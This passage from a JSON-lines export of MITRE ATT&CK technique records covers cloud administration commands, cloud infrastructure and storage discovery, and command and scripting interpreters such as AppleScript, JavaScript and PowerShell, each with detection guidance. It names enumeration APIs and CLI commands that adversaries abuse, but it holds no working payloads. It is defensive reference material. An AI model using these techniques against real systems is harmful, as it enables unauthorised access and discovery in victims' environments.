2017),(Citation: Symantec Chafer February 2018),(Citation: Github Koadic),(Citation: ESET Attor Oct 2019),(Citation: ESET RTM Feb 2017),(Citation: Securelist Remexi Jan 2019),(Citation: Kaspersky TajMahal April 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: FireEye APT38 Oct 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: Cylance Cleaver),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: F-Secure Cosmicduke),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ESET Casbaneiro Oct 2019),(Citation: Malwarebytes DarkComet March 2018),(Citation: Symantec Chafer Dec 2015),(Citation: Bitdefender Agent Tesla April 2020),"}
{"ID":"T1651","name":"Cloud Administration Command","description":"Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.(Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)","url":"https://attack.mitre.org/techniques/T1651","created":"13 March 2023","last modified":"14 April 2023","version":"1.0","tactics":"Execution","detection":null,"platforms":"Azure AD, IaaS","data sources":"Command: Command Execution, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Adrien Bataille; Anders Vejlby; Caio Silva; Cisco; Jared Wilson; Nader Zaveri; Nichols Jasper","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AADInternals Root Access to Azure VMs),(Citation: MSTIC Nobelium Oct 2021),(Citation: Mandiant Azure Run Command 2021),(Citation: AWS Setting Up Run Command)"}
{"ID":"T1580","name":"Cloud Infrastructure Discovery","description":"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.","url":"https://attack.mitre.org/techniques/T1580","created":"20 August 2020","last modified":"20 April 2022","version":"1.3","tactics":"Discovery","detection":"Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users and enumerations from unknown or malicious IP addresses. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":"IaaS","data sources":"Cloud Storage: Cloud Storage Enumeration, Instance: Instance Enumeration, Snapshot: Snapshot Enumeration, Volume: Volume Enumeration","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Isif Ibrahima, Mandiant; Praetorian; Regina Elwell","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1538","name":"Cloud Service Dashboard","description":"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.","url":"https://attack.mitre.org/techniques/T1538","created":"30 August 2019","last modified":"16 March 2021","version":"1.1","tactics":"Discovery","detection":"Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)","platforms":"Azure AD, Google Workspace, IaaS, Office 365","data sources":"Logon Session: Logon Session Creation, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1526","name":"Cloud Service Discovery","description":"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable Cloud Logs](https://attack.mitre.org/techniques/T1562/008).","url":"https://attack.mitre.org/techniques/T1526","created":"30 August 2019","last modified":"04 May 2023","version":"1.3","tactics":"Discovery","detection":"Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Cloud Service: Cloud Service Enumeration","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian; Suzy Schapperle - Microsoft Azure Red Team; Thanabodi Phrakhun, I-SECURE","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Roadtools),(Citation: AADInternals Documentation),"}
{"ID":"T1619","name":"Cloud Storage Object Discovery","description":"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .","url":"https://attack.mitre.org/techniques/T1619","created":"01 October 2021","last modified":"11 April 2022","version":"1.0","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained. \nMonitor cloud logs for API calls used for file or object enumeration for unusual activity. ","platforms":"IaaS","data sources":"Cloud Storage: Cloud Storage Access, Cloud Storage: Cloud Storage Enumeration","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Isif Ibrahima, Mandiant; Regina Elwell","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Peirates GitHub),"}
{"ID":"T1059","name":"Command and Scripting Interpreter","description":"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)","url":"https://attack.mitre.org/techniques/T1059","created":"31 May 2017","last modified":"27 March 2023","version":"2.4","tactics":"Execution","detection":"Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Network, Office 365, Windows, macOS","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Donut Github),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Talos PoetRAT October 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: FireEye Hacking Team),(Citation: FireEye FIN7 Aug 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye APT39 Jan 2019),(Citation: Nccgroup Gh0st April 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: US-CERT TA18-074A),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: ESET Operation Spalax Jan 2021),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Github PowerShell Empire),(Citation: ESET ForSSHe December 2018),(Citation: ANSSI Sandworm January 2021),(Citation: OilRig ISMAgent July 2017),(Citation: CheckPoint Bandook Nov 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Crowdstrike DNC June 2016),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye APT37 Feb 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Symantec Whitefly March 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET Sednit Part 2),(Citation: Unit42 OilRig Nov 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: FireEye APT19),(Citation: FireEye FiveHands April 2021),(Citation: NCC Group Fivehands June 2021),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PowerShell CLM),(Citation: win10_asr),(Citation: Microsoft PS JEA),(Citation: Netspi PowerShell Execution Policy Bypass)"}
{"ID":"T1059.002","name":"Command and Scripting Interpreter: AppleScript","description":"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)","url":"https://attack.mitre.org/techniques/T1059/002","created":"09 March 2020","last modified":"19 October 2022","version":"1.1","tactics":"Execution","detection":"Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","platforms":"macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":"Phil Stokes, SentinelOne","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: wardle evilquest parti),(Citation: objsee mac malware 2017),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: applescript signing)"}
{"ID":"T1059.009","name":"Command and Scripting Interpreter: Cloud API","description":"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ","url":"https://attack.mitre.org/techniques/T1059/009","created":"17 March 2022","last modified":"14 April 2023","version":"1.0","tactics":"Execution","detection":null,"platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Command: Command Execution","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":"Caio Silva; Jason Sevilla; Marcus Weeks; Nichols Jasper; Ozan Olali","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos TeamTNT),(Citation: MSTIC Nobelium Toolset May 2021),"}
{"ID":"T1059.007","name":"Command and Scripting Interpreter: JavaScript","description":"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","url":"https://attack.mitre.org/techniques/T1059/007","created":"23 June 2020","last modified":"16 August 2021","version":"2.1","tactics":"Execution","detection":"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":"Cody Thomas, SpecterOps","permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Donut Github),(Citation: Malwarebytes Higaisa 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: PTSecurity Higaisa 2020),(Citation: Cybereason Valak May 2020),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint TA505 June 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: ATT Sidewinder January 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: SecureList Griffon May 2019),(Citation: ESET Turla Mosquito Jan 2018),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Trend Micro FIN6 October 2019),(Citation: Mandiant APT41),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Zscaler Higaisa 2020),(Citation: Cofense Astaroth Sept 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Hornet Security Avaddon June 2020),(Citation: Awake Security Avaddon),(Citation: Group IB Cobalt Aug 2017),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ESET EvilNum July 2020),(Citation: Proofpoint TA505 Sep 2017),(Citation: Cylance Dust Storm),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Symantec WastedLocker June 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: win10_asr)"}
{"ID":"T1059.008","name":"Command and Scripting Interpreter: Network Device CLI","description":"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)","url":"https://attack.mitre.org/techniques/T1059/008","created":"20 October 2020","last modified":"19 April 2022","version":"1.1","tactics":"Execution","detection":"Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)\n\nConsider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.","platforms":"Network","data sources":"Command: Command Execution","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - TACACS)"}
{"ID":"T1059.001","name":"Command and Scripting Interpreter: PowerShell","description":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)","url":"https://attack.mitre.org/techniques/T1059/001","created":"09 March 2020","last modified":"27 March 2023","version":"1.3","tactics":"Execution","detection":"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\n\nConsider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":"Mayuresh Dani, Qualys; Praetorian; Ross Brittain","permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Dragos Crashoverride 2018),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Talos Zeus Panda Nov 2017),(Citation: Microsoft Prestige ransomware October 2022),(Citation: FireEye Obfuscation June 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Trend Micro Black Basta May 2022),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: ATT Sidewinder January 2021),(Citation: Kaspersky WIRTE November 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: PTSecurity Cobalt Dec 2016),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: SecureWorks August 2019),(Citation: Korean FSI TA505 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Cobalt Strike September 2020),(Citation: CME Github September 2018),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Kaspersky APT Trends Q1 April 2021),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Morphisec ShellTea June 2019),(Citation: Github PowerShell Empire),(Citation: Trend Micro TA505 June 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Kaspersky Poseidon Group),(Citation: Unit 42 DarkHydrus July 2018),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec Gallmaker Oct 2018),(Citation: FireEye FIN7 March 2017),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Talos Promethium June 2020),(Citation: 